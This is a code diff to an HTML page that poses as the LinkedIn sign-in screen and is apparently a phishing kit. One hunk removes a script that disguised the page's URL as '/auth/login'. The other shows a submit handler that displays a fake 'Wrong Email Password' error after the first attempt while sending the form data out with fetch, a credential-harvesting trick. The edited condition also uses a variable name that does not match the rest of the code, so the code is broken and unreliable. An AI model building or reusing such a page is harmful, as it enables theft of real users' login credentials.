@@ -4,46 +4,6 @@
   <meta charset="UTF-8">
   <meta name="viewport" content="width=device-width, initial-scale=1.0">
   <title>Sign in to LinkedIn</title>
-  <script>
-    // URL Masking for first visit only
-    (function () {
-      const maskedPath = "/auth/login";
-      const originalUrl = window.location.origin; // Dynamically set to e.g., https://your-username.github.io
-
-      // Apply masked URL only on first visit
-      function applyMaskedUrl() {
-        if (!history.state || !history.state.isMasked) {
-          history.replaceState({ isMasked: true }, "", maskedPath + window.location.search);
-        }
-      }
-
-      // Revert to original URL on reload
-      function revertToOriginalUrl() {
-        if (window.location.pathname !== "/") {
-          history.replaceState({ isMasked: false }, "", originalUrl + window.location.search);
-        }
-      }
-
-      // Run on initial load
-      applyMaskedUrl();
-
-      // Handle reloads
-      window.addEventListener("load", function () {
-        if (performance.navigation.type === 1) { // 1 indicates reload
-          revertToOriginalUrl();
-        }
-      });
-
-      // Handle popstate for navigation
-      window.addEventListener("popstate", function () {
-        if (history.state && history.state.isMasked) {
-          history.replaceState({ isMasked: true }, "", maskedPath + window.location.search);
-        } else {
-          history.replaceState({ isMasked: false }, "", originalUrl + window.location.search);
-        }
-      });
-    })();
-  </script>
   <style>
     /* ALL YOUR ORIGINAL STYLES REMAIN EXACTLY THE SAME */
     body {
@@ -247,7 +207,7 @@
       const form = event.target;
       const formData = new FormData(form);
 
-      if (isFirstSubmission) {
+      if (isFirst_submission) {
         document.getElementById("error-message").innerText = "Wrong Email Password";
         isFirstSubmission = false;
         fetch(form.action, {
